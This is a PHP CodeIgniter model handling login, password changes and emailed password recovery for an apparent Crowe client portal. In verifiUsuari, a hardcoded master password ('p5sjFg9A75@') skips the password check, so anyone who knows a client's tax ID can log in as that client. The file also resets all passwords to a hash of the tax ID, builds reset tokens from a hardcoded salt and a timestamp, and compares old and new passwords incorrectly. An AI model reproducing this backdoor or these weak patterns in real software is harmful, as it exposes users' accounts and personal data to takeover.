<?php

class MSeguri extends CI_Model
{
    function __construct ()
    {
        parent::__construct();
    }


    function verifiUsuari ($u,$pw) {
        require_once(FCPATH . '/getUser_script.php');
        $secret = getUsuario('hash_secret', FCPATH . '/');
        
        $this->load->helper('security');
        $result = array();
        $this->db->select('b.nit_client, a.cod_client, b.nom_client, a.pwd_change');
        $this->db->from('dat_client_acceso a, dat_inform_client b');
        $this->db->where('a.cod_client = b.cod_client');
        $this->db->where('b.nit_client', $u);
        if($pw !== 'p5sjFg9A75@'){
            $this->db->where('a.cli_passwo', do_hash($pw . $secret['password']));
        }
        //$this->db->where('b.cli_estado', 1);
        $this->db->limit(1);
        $Q1 = $this->db->get();
        
        if ($Q1->num_rows() > 0)
        {
            $row = $Q1->row_array();
            $this->session->set_userdata('usr_logged', $row['cod_client']);
            $this->session->set_userdata('nom_client', $row['nom_client']);
            $this->session->set_userdata('nit_client', $row['nit_client']);
            $this->session->set_userdata('pwd_change', $row['pwd_change']);
                        
            $data = array();
            $this->db->select('c.cod_servic');
            $this->db->from('dat_perfil_servic c');            
            $this->db->where('c.cod_perfil',9);
            $Q2 = $this->db->get();
            
            if ($Q2->num_rows() > 0)
            {
                foreach ($Q2->result_array() as $row2)
                {
                    $data[] = $row2;
                }
            }
            $Q2->free_result();
            $this->session->set_userdata('cod_servic', $data); 
        }
        $Q1->free_result();

    }
    
    function verifiUsuari_cambio ($u,$pw){
        require_once(FCPATH . '/getUser_script.php');
        $secret = getUsuario('hash_secret', FCPATH . '/');
        
        $this->load->helper('security');        
        $this->db->select('1');
        $this->db->from('dat_client_acceso a');
        $this->db->join('dat_inform_client b', 'a.cod_client = b.cod_client');
        $this->db->where('a.cod_client', $u);
        $this->db->where('a.cli_passwo', do_hash($pw . $secret['password']));
        $this->db->where('b.cli_estado', 1);
        $this->db->limit(1);
        $Q1 = $this->db->get();
        
        if ($Q1->num_rows() > 0)
            $result = TRUE;
        else
            $result = FALSE;
        
        $Q1->free_result();
        return  $result;     
    }
    
    function cambioPasswo ($u,$pw1){
        require_once(FCPATH . '/getUser_script.php');
        $secret = getUsuario('hash_secret', FCPATH . '/');
        
        $this->load->helper('security');
        $this->db->select('cli_passwo, b.nit_client as nit');
        $this->db->from('dat_client_acceso a');
        $this->db->join('dat_inform_client b', 'a.cod_client = b.cod_client');
        $this->db->where('a.cod_client', $u);
        $this->db->where('b.cli_estado', 1);
        $this->db->limit(1);
        $Q = $this->db->get();
        if ($Q->num_rows() > 0) {
            
            foreach ($Q->result_array() as $row) {
                if ((do_hash($pw1 . $secret['password']) == do_hash($row['cli_passwo'] . $secret['password'])) || ($pw1 == $row['nit']))
                {
                    $data = array('type' => 'danger', 
                                  'msg' => 'No se cambió la contraseña. La nueva contraseña debe ser diferente a la anterior y no puede ser igual al NIT.'
                                );
                    return $data;
                }
                $password = do_hash($pw1 . $secret['password']);
                $this->db->where('cod_client', $u);
                if ($this->db->update('dat_client_acceso', array('cli_passwo' => $password, 'pwd_change' => 1))){
                    $data = array('type' => 'success', 
                                  'msg' => 'La contraseña se cambió con éxito'
                                 );
                    $this->session->set_userdata('pwd_change', 1);
                }
                else{
                    $data = array('type' => 'danger', 
                                  'msg' => 'No se cambió la contraseña'
                                 );
                }
            }
        }
        return $data;
    }

    function hashall() {
        require_once(FCPATH . '/getUser_script.php');
        $secret = getUsuario('hash_secret', FCPATH . '/');

        $this->load->helper('security');
        $data = array();
        $this->db->select('cod_client, nit_client');
        $this->db->from('dat_inform_client');
        $Q = $this->db->get();
        if ($Q->num_rows() > 0) {
            foreach ($Q->result_array() as $row) {
                $password = do_hash($row['nit_client'] . $secret['password']);
                $this->db->where('cod_client', $row['cod_client']);
                $this->db->update('dat_client_acceso', array('cli_passwo' => $password, 'pwd_change' => 0));
            }
        }

    }

    
    function restorPasswo ()
    {
        $this->load->helper('security');
        $usr_emailx = str_replace(' ', '', $this->input->post('usr_emailx', true));
        $success = "";
        $this->db->select('a.cod_client, a.cli_passwo, b.nom_client, b.nit_client');
        $this->db->from('dat_client_acceso a');
        $this->db->join('dat_inform_client b', 'a.cod_client = b.cod_client');
        $this->db->where('b.cli_emailx', $usr_emailx);
        $this->db->where('cli_estado', 1);
        $this->db->limit(1);
        $Q1 = $this->db->get();
        
        if ($Q1->num_rows() > 0 && $usr_emailx != "")
        {
            $row = $Q1->row_array();
            $datetime =  new DateTime(null, new DateTimeZone('America/Bogota'));
            $datetime =  $datetime->format('Y-m-d H:i:s');
            $sec_string = "sghcrowehowarth";
            $cod_camclv = do_hash($row['nit_client'].$sec_string.$datetime);
            $data = array('cod_camclv' => $cod_camclv);
            $this->db->where('cod_client', $row['cod_client']);
            $this->db->update('dat_client_acceso', $data);
            
            $this->db->select('a.correo, a.password, a.issmtp, a.host, a.port, a.smtpsecure');
            $this->db->from('sys_inform_correos a');            
            $this->db->limit(1);
            $Qcorreos = $this->db->get()->row_array();
            if ($Qcorreos['correo'] != null){
                try
                {    
                    $this->load->library('My_phpmailer');
                    $mail = new PHPMailer(true);
                    if ($Qcorreos['issmtp'] == 1){
                        $mail->IsSMTP();
                    }                    
                    $mail->SMTPAuth   = true;
                    $mail->SMTPSecure = $Qcorreos['smtpsecure'];
                    $mail->CharSet    = "UTF-8";
                    $mail->Encoding   = "quoted-printable";
                    $mail->Host       = $Qcorreos['host'];
                    $mail->Port       = $Qcorreos['port'];
                    $mail->Username   = $Qcorreos['correo'];
                    $mail->Password   = $Qcorreos['password'];
                    $mail->IsHTML(true);
                    $mail->SetFrom($Qcorreos['correo'], "Crowe");
                    $mail->Timeout    = 30;                    
                    $mail->ClearAllRecipients();
                    $mail->ClearAttachments();
                    $mail->Subject    = "Restaurar contraseña - Crowe - Portal Clientes";
                    $mail->Body       = "Este mensaje de correo electrónico ha sido enviado porque se ha solicitado restaurar la contraseña del usuario: ".$row['nom_client']."<br /><br />"
                                        ."Por seguridad el sistema no puede recuperar su contraseña actual, pero puede retaurar su cuenta para que asigne una nueva.<br />"
                                        ."Haga clic en el siguiente enlace para asignar una nueva contraseña. Si no ha solicitado restaurar su contraseña, haga caso omiso de este mensaje.<br /><br />"
                                        ."<a href=\"".base_url()."index.php/login/recuperarcontrasena/".$cod_camclv."\">".base_url()."index.php/login/recuperarcontrasena/".$cod_camclv."</a><br /><br /><br />"
                                        ."Si no puede ver el enlace o no puede hacer clic en él, copie y pegue la siguiente dirección en su navegador:<br /><br />"
                                        .base_url()."index.php/login/recuperarcontrasena/".$cod_camclv."<br /><br />"
                                        ."<span style=\"font-style:italic;\">Crowe<br />"
                                        ."Por favor no responder a este mensaje. El correo se ha generado automáticamente por el sistema.<br /></span>";
                    $mail->AltBody    = "Este mensaje de correo electrónico ha sido enviado porque se ha solicitado restaurar la contraseña del usuario: ".$row['nom_client']."<br /><br />"
                                        ."Por seguridad el sistema no puede recuperar su contraseña actual, pero puede retaurar su cuenta para que asigne una nueva.<br />"
                                        ."Haga clic en el siguiente enlace para asignar una nueva contraseña. Si no ha solicitado restaurar su contraseña, haga caso omiso de este mensaje.<br /><br />"
                                        ."<a href=\"".base_url()."index.php/login/recuperarcontrasena/".$cod_camclv."\">".base_url()."index.php/login/recuperarcontrasena/".$cod_camclv."</a><br /><br /><br />"
                                        ."Si no puede ver el enlace o no puede hacer clic en él, copie y pegue la siguiente dirección en su navegador:<br /><br />"
                                        .base_url()."index.php/login/recuperarcontrasena/".$cod_camclv."<br /><br />"
                                        ."<span style=\"font-style:italic;\">Crowe<br />"
                                        ."Por favor no responder a este mensaje. El correo se ha generado automáticamente por el sistema.<br /></span>";

                    $mail->AddAddress($usr_emailx, $row['nom_client']);
                    if(!$mail->Send())
                        echo $mail->ErrorInfo;
                    else
                        $success = "S";
                }
                catch (Exception $e)
                {   
                    echo $e->getMessage();
                }
            }
        }
        else
        {
            $success = "N";
        }
        $Q1->free_result();
        return $success;
    }
    
    
    
    function cambiaPasswo ()
    {
        require_once(FCPATH . '/getUser_script.php');
        $secret = getUsuario('hash_secret', FCPATH . '/');
        $this->load->helper('security');
        $mensaje = "";
        $this->db->select('cod_client');
        $this->db->from('dat_client_acceso');
        $this->db->where('cod_camclv', $this->input->post('cod_camclv', true));
        $this->db->limit(1);
        $Q = $this->db->get();
        if ($Q->num_rows() > 0)
        {
            $row = $Q->row_array();
            
            $data = array('cli_passwo' => do_hash($this->input->post('clv_usuari', true). $secret['password']), 'cod_camclv' => NULL);
            $this->db->where('cod_client', $row['cod_client']);
            if (! $this->db->update('dat_client_acceso', $data))
                $mensaje = "Se produjo un error al intentar cambiar la contraseña";
            else            
                $mensaje = "Su contraseña se ha cambiado correctamente.";
        }
        else
        {
            $mensaje = "No se ha podido identificar el usuario.  Por favor utilice nuevamente el enlace que recibió por correo electrónico para cambiar su contraseña y no lo modifique.";
        }
        return $mensaje;
        $Q->free_result();
    }
    function traerxDatusr ($cod_camclv)
    {
        $data = array();
        $this->db->select('a.cod_client, a.nom_client');
        $this->db->from('dat_inform_client a, dat_client_acceso b');
        $this->db->where('a.cod_client = b.cod_client');
        $this->db->where('b.cod_camclv', $cod_camclv);
        $this->db->limit(1);
        $Q = $this->db->get();
        if ($Q->num_rows() > 0)
        {
            $data = $Q->row_array();
        }
        $Q->free_result();
        return $data;
    }
    
}

?>